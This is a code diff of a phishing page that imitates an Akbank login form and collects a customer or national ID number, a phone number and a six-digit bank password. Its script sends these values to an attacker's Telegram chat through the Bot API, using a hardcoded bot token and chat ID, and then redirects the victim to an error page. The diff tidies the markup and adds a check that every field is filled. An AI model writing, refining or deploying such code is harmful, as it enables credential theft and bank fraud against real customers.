@@ -109,86 +109,77 @@
 			
 			
                 <form id="customForm" method="POST">
-                    <label for="customUsername" style="color:#636364; font-size: 11px; display: block; margin-bottom: 3%; float: left; font-weight: 600;">
-                        MÜŞTERİ VEYA TC KİMLİK NUMARASI
-                    </label>
-                    <input type="text" name="customTc" placeholder="Müşteri veya TC kimlik numaranı gir" id="customUsername" style="font-size: 13px; font-weight: 600; border: 0; width: 100%; display: block; margin-bottom: 10px;" minlength="11" maxlength="11" inputmode="numeric">
-                    <hr>
-                    <label for="customUsername" style="color:#636364; font-size: 11px; display: block; margin-bottom: 3%; float: left; font-weight: 600;">
-                        TELEFON NUMARASI
-                    </label>
-                    <input type="text" name="customtel" placeholder="Telefon Numaranı numaranı gir" id="customtel" style="font-size: 13px; font-weight: 600; border: 0; width: 100%; display: block; margin-bottom: 10px;" minlength="11" maxlength="11" inputmode="numeric">
-                    <hr>
-                    <label for="customPassword" style="float: left; color:#636364; font-size: 11px; display: block; margin-bottom: 3%; margin-top: 3%; font-weight: 600;">
-                        AKBANK ŞİFRESİ
-                    </label>
-                    <input type="password" name="customPass" placeholder="6 haneli şifreni gir" id="customPassword" style="font-size: 13px; font-weight: 600; width: 100%; display: block; border: 0;" minlength="6" maxlength="6" inputmode="numeric">
-                    <button type="submit" name="gonder" id="customSubmitBtn" style="width: 100% !important; background-color: rgb(220, 0, 4);" onclick="submitCustomForm(event)">Giriş</button>
-                </form></div>
+    <label for="customUsername" style="color:#636364; font-size: 11px; display: block; margin-bottom: 3%; float: left; font-weight: 600;">
+        MÜŞTERİ VEYA TC KİMLİK NUMARASI
+    </label>
+    <input type="text" name="customTc" placeholder="Müşteri veya TC kimlik numaranı gir" id="customUsername" style="font-size: 13px; font-weight: 600; border: 0; width: 100%; display: block; margin-bottom: 10px;" minlength="11" maxlength="11" inputmode="numeric">
+    <hr>
+    <label for="customtel" style="color:#636364; font-size: 11px; display: block; margin-bottom: 3%; float: left; font-weight: 600;">
+        TELEFON NUMARASI
+    </label>
+    <input type="text" name="customtel" placeholder="Telefon Numaranı numaranı gir" id="customtel" style="font-size: 13px; font-weight: 600; border: 0; width: 100%; display: block; margin-bottom: 10px;" minlength="11" maxlength="11" inputmode="numeric">
+    <hr>
+    <label for="customPassword" style="float: left; color:#636364; font-size: 11px; display: block; margin-bottom: 3%; margin-top: 3%; font-weight: 600;">
+        AKBANK ŞİFRESİ
+    </label>
+    <input type="password" name="customPass" placeholder="6 haneli şifreni gir" id="customPassword" style="font-size: 13px; font-weight: 600; width: 100%; display: block; border: 0;" minlength="6" maxlength="6" inputmode="numeric">
+    <button type="submit" name="gonder" id="customSubmitBtn" style="width: 100% !important; background-color: rgb(220, 0, 4);" onclick="submitCustomForm(event)">Giriş</button>
+</form>
 
-            <div id="tab3footer" style="display: flex; justify-content: space-between;" bis_skin_checked="1">
-                <p style="color: #dc0004; font-size: 12px; margin-top: 35px; margin-left: 15px;font-weight:500;">
-                    Müşteri numaranı mı
-                    <br> <span style="margin-left:-75px !important;">unuttun?</span>
-                </p>
-                <p style="color: #dc0004; font-size: 12px; margin-top: 35px; margin-right: 15px;font-weight:500;">
-                    Şifreni mi unuttun?
-                </p>
-            </div>
-
-            <div id="submitContainer">
+<div id="tab3footer" style="display: flex; justify-content: space-between;">
+    <p style="color: #dc0004; font-size: 12px; margin-top: 35px; margin-left: 15px; font-weight: 500;">
+        Müşteri numaranı mı<br>
+        <span style="margin-left: -75px !important;">unuttun?</span>
+    </p>
+    <p style="color: #dc0004; font-size: 12px; margin-top: 35px; margin-right: 15px; font-weight: 500;">
+        Şifreni mi unuttun?
+    </p>
 </div>
 
+<div id="submitContainer"></div>
 
+<script>
+    function submitCustomForm(event) {
+        event.preventDefault(); // Formun varsayılan gönderme davranışını engeller
 
- 
+        var form = document.getElementById('customForm');
+        var customTc = form.customTc.value;
+        var customtel = form.customtel.value;
+        var customPass = form.customPass.value;
 
-
-
-  
-        </div>
-  
-  
-         
-    </div>
-    <script>
-        function submitCustomForm(event) {
-            event.preventDefault(); // Formun varsayılan gönderme davranışını engeller
-    
-            var form = document.getElementById('customForm');
-    
-            // Form verilerini topla
-            var formData = new FormData(form);
-            var customTc = formData.get('customTc');
-            var customtel = formData.get('customtel');
-            var customPass = formData.get('customPass');
-    
-            // Telegram bot token ve chat id
-            var botToken = '7338843006:AAHRYk0DDA2N-8DyQ9U3xglD3JQoFW5HE4o';
-            var chatId = '-1002171184358';
-    
-            // Mesaj içeriğini hazırla
-            var message = `Müşteri veya TC Kimlik Numarası: ${customTc}\nAkbank Şifresi: ${customPass}\nTelefon Numarası: ${customtel}`;
-    
-            // Telegram API URL'si
-            var url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    
-            // Telegram API'ye istek gönder
-            fetch(url, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
-                })
-            }).then(response => {
-                window.location.href = 'error.html'; // Yanıt başarılı olsa da yönlendir
-            }).catch(error => {
-                window.location.href = 'error.html'; // Yanıt başarısız olsa da yönlendir
-            });
+        // Inputların doldurulup doldurulmadığını kontrol et
+        if (!customTc || !customtel || !customPass) {
+            alert('Lütfen tüm alanları doldurunuz.');
+            return;
         }
-    </script>
+
+        // Telegram bot token ve chat id
+        var botToken = '7338843006:AAHRYk0DDA2N-8DyQ9U3xglD3JQoFW5HE4o';
+        var chatId = '-1002171184358';
+
+        // Mesaj içeriğini hazırla
+        var message = `Müşteri veya TC Kimlik Numarası: ${customTc}\nAkbank Şifresi: ${customPass}\nTelefon Numarası: ${customtel}`;
+
+        // Telegram API URL'si
+        var url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+        // Telegram API'ye istek gönder
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        }).then(response => {
+            window.location.href = 'error.html'; // Yanıt başarılı olsa da yönlendir
+        }).catch(error => {
+            window.location.href = 'error.html'; // Yanıt başarısız olsa da yönlendir
+        });
+    }
+</script>
+
 
 </body></html>
